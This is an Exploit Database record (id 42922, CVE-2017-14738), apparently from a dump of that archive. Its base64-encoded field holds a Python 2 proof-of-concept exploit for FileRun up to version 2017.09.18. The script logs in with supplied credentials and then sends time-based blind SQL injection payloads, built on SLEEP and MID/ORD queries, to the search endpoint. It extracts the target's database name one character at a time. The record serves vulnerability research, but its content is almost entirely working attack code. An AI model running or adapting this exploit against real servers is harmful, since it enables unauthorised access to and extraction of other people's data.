{
    "source": "exploit-database", 
    "exploit": "IyEvdXNyL2Jpbi9lbnYgcHl0aG9uDQojIEV4cGxvaXQgVGl0bGU6IEZpbGVSdW4gPD0yMDE3LjA5LjE4DQojIERhdGU6IFNlcHRlbWJlciAyOSwgMjAxNw0KIyBFeHBsb2l0IEF1dGhvcjogU1BBUkMNCiMgVmVuZG9yIEhvbWVwYWdlOiBodHRwczovL3d3dy5maWxlcnVuLmNvbS8NCiMgU29mdHdhcmUgTGluazogaHR0cDovL2YuYWZpYW4uc2Uvd2wvP2lkPUVIUWhYaFhMR2FNRlU3akk4bVlOUk44dldrRzlMVVZQJnJlY2lwaWVudD1kM2QzTG1acGJHVnlkVzR1WTI5dA0KIyBWZXJzaW9uOiAyMDE3LjA5LjE4DQojIFRlc3RlZCBvbjogVWJ1bnR1IDE2LjA0LjMsIEFwYWNoZSAyLjQuNywgUEhQIDcuMA0KIyBDVkUgOiBDVkUtMjAxNy0xNDczOA0KIyANCg0KaW1wb3J0IHN5cyx0aW1lLHVybGxpYix1cmxsaWIyLGNvb2tpZWxpYg0KZnJvbSB0aW1lIGltcG9ydCBzbGVlcA0KDQpwcmludCAiIiINCiM9PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT0jDQp8ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfA0KfCAgICAgICAgICAgIF9fX3wgICAgICAgICAgICAgICAgICAgfCAgICAgICAgICAgICAgICAgICAgICAgICAgIHwNCnwgICAgICAgICAgXF9fXyBcICBfXyBcICAgXyBcIF9fIFwgIF9ffCAgXyBcICBfX3wgX2AgfCAgICAgICAgICB8DQp8ICAgICAgICAgICAgICAgIHwgfCAgIHwgIF9fLyB8ICAgfCB8ICAgIF9fLyB8ICAgKCAgIHwgICAgICAgICAgfA0KfCAgICAgICAgICBfX19fXy8gIC5fXy8gXF9fX3xffCAgX3xcX198XF9fX3xffCAgXF9fLF98ICAgICAgICAgIHwNCnwgICAgICAgICAgICAgICAgIF98ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB8DQp8ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfA0KfCAgICAgICAgICAgICAgICAgICBGaWxlUnVuIDw9IDIwMTcuMDkuMTggICAgICAgICAgICAgICAgICAgICAgIHwNCnwgICAgICAgQmxpbmRTUUxpIFByb29mIG9mIENvbmNlcHQgKFBvc3QgQXV0aGVudGljYXRpb24pICAgICAgICB8ICAgICAgICAgIA0KfCAgICAgICAgYnkgU3BlbnRlcmEgUmVzZWFyY2ggKHJlc2VhcmNoW2F0XXNwZW50ZXJhLmlkKSAgICAgICAgIHwNCnwgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB8DQojPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09Iw0KIiIiDQoNCg0KaG9zdCA9IHJhd19pbnB1dCgiWypdIFRhcmdldCBJUDogIikNCnVzZXJuYW1lID0gcmF3X2lucHV0KCJbKl0gVXNlcm5hbWU6ICIpDQpwYXNzd29yZCA9IHJhd19pbnB1dCgiWypdIFBhc3N3b3JkOiAiKQ0KdGFyZ2V0ID0gJ2h0dHA6Ly8lcy8/bW9kdWxlPXNlYXJjaCZzZWN0aW9uPWFqYXgmcGFnZT1ncmlkJyAlKGhvc3QpDQpkZWxheT0xDQpnbG9iYWwgY29va2llLGRhdGENCg0KDQoNCmRlZiBtYXN1ayh1c3IscHN3ZCk6DQogICAgbG9nX2RhdGEgPSB7DQogICAgICAgICd1c2VybmFtZSc6IHVzciwNCiAgICAgICAgJ3Bhc3N3b3JkJzogcHN3ZA0KICAgIH0NCiANCiAgICBwb3N0X2RhdGEgPSB1cmxsaWIudXJsZW5jb2RlKGxvZ19kYXRhKQ0KICAgIGNvb2tqYXIgPSBjb29raWVsaWIuQ29va2llSmFyKCkNCiAgICBvcGVuZXIgPSB1cmxsaWIyLmJ1aWxkX29wZW5lcih1cmxsaWIyLkhUVFBDb29raWVQcm9jZXNzb3IoY29va2phcikpDQogICAgdHJ5OgkNCiAgICAJcmVxID0gdXJsbGliMi5SZXF1ZXN0KCdodHRwOi8vJXMvP21vZHVsZT1maWxlbWFuJnBhZ2U9bG9naW4mYWN0aW9uPWxvZ2luJyUoaG9zdCksIHBvc3RfZGF0YSkNCiAgICAJY29udGVudCA9IG9wZW5lci5vcGVuKHJlcSkNCiAgICAJZ2xvYmFsIGRhdGEsY29va2llDQogICAgCWRhdGEgPSBkaWN0KChjb29raWUubmFtZSwgY29va2llLnZhbHVlKSBmb3IgY29va2llIGluIGNvb2tqYXIpDQogICAgCWNvb2tpZSA9ICgibGFuZ3VhZ2U9ZW5nbGlzaDsgRmlsZVJ1blNJRD0lcyIlKGRhdGFbJ0ZpbGVSdW5TSUQnXSkpDQogICAgCXJldHVybiBzdHIoY29udGVudC5yZWFkKCkpDQogICAgZXhjZXB0OiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIA0KICAgIAlwcmludCAnXG5bLV0gVWggb2ghIEV4cGxvaXQgZmFpbC4uIFBMRUFTRSBDSEVDSyBZT1VSIENSRURFTlRJQUwnICAgICAgICAgICAgICAgIA0KICAgIAlzeXMuZXhpdCgwKQ0KDQpkZWYga29uZWsobSxuKToNCgkjYm9ycm93IGZyb20gU1FMbWFwIDopDQoJcXVlcnk9KCI3KSBBTkQgKFNFTEVDVCAqIEZST00gKFNFTEVDVChTTEVFUCglcy0oSUYoT1JEKE1JRCgoSUZOVUxMKENBU1QoREFUQUJBU0UoKSBBUyBDSEFSKSwweDIwKSksJXMsMSkpPiVzLDAsMSkpKSkpd1NtRCkgQU5EICg4ODYyPTg4NjIiICUoZGVsYXksbSxuKSkNCgl2YWx1ZXMgPSB7ICdtZXRhZmllbGQnOiBxdWVyeSwgICAgICAgICAgICAgDQogICAgICAgIAkgICAnc2VhcmNoVHlwZSc6ICdtZXRhJywNCiAgICAgICAgCSAgICdrZXl3b3JkJzogJ3dvcmsnLA0KICAgICAgICAJICAgJ3NlYXJjaFBhdGgnOiAnL1JPT1QvSE9NRScsDQoJICAgICAgICAgICAncGF0aCc6ICcvUk9PVC9TRUFSQ0gnIH0NCgkgDQoJcmVxID0gdXJsbGliMi5SZXF1ZXN0KHRhcmdldCwgdXJsbGliLnVybGVuY29kZSh2YWx1ZXMpKSAgICAgICAgICAgICAgICAgICAgICAgICANCglyZXEuYWRkX2hlYWRlcignQ29va2llJywgY29va2llKSAgDQoJdHJ5OiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICANCiAgICAJCXN0YXJ0dGltZT10aW1lLnRpbWUoKQ0KICAgIAkJcmVzcG9uc2UgPSAJdXJsbGliMi51cmxvcGVuKHJlcSkNCiAgICAJCWVuZHRpbWUgPSB0aW1lLnRpbWUoKQ0KICAgIAkJcmV0dXJuIGludChlbmR0aW1lLXN0YXJ0dGltZSkNCiANCglleGNlcHQ6ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgDQogICAgCQlwcmludCAnXG5bLV0gVWggb2ghIEV4cGxvaXQgZmFpbC4uJyAgICAgICAgICAgICAgICANCiAgICAJCXN5cy5leGl0KDApDQoNCnByaW50ICJbK10gTG9nZ2luZyBpbiB0byB0aGUgYXBwbGljYXRpb24uLi4iDQpzbGVlcCgxKQ0KY2VrbWFzdWsgPSBtYXN1ayh1c2VybmFtZSxwYXNzd29yZCkNCmlmIHUnc3VjY2VzcycgaW4gY2VrbWFzdWs6DQoJcHJpbnQgIlsqXSBVc2luZyBUaW1lLUJhc2VkIG1ldGhvZCB3aXRoICVkcyBkZWxheS4iJWludChkZWxheSkNCglwcmludCAiWytdIFN0YXJ0aW5nIHRvIGR1bXAgY3VycmVudCBkYXRhYmFzZS4gVGhpcyBtaWdodCB0YWtlIHRpbWUuLiINCglzeXMuc3Rkb3V0LndyaXRlKCdbK10gVGFyZ2V0IGN1cnJlbnQgZGF0YWJhc2UgaXM6ICcpDQoJc3lzLnN0ZG91dC5mbHVzaCgpDQoNCglzdGFydHRpbWUgPSB0aW1lLnRpbWUoKQ0KCWZvciBtIGluIHJhbmdlKDEsMjU2KToNCgkJZm9yIG4gaW4gcmFuZ2UoMzIsMTI2KToNCgkJCXdrdHR1bmdndSA9IGtvbmVrKG0sbikJCQ0KCQkJaWYgKHdrdHR1bmdndSA8IGRlbGF5KToJCQkJDQoJCQkJc3lzLnN0ZG91dC53cml0ZShjaHIobikpDQoJCQkJc3lzLnN0ZG91dC5mbHVzaCgpDQoJCQkJYnJlYWsNCgllbmR0aW1lID0gdGltZS50aW1lKCkNCglwcmludCAiXG5bK10gRG9uZSBpbiAlZCBzZWNvbmRzIiAlaW50KGVuZHRpbWUtc3RhcnR0aW1lKQ==", 
    "filename": "platforms/php/webapps/42922.py", 
    "id": "42922", 
    "cves": [
        "CVE-2017-14738"
    ]
}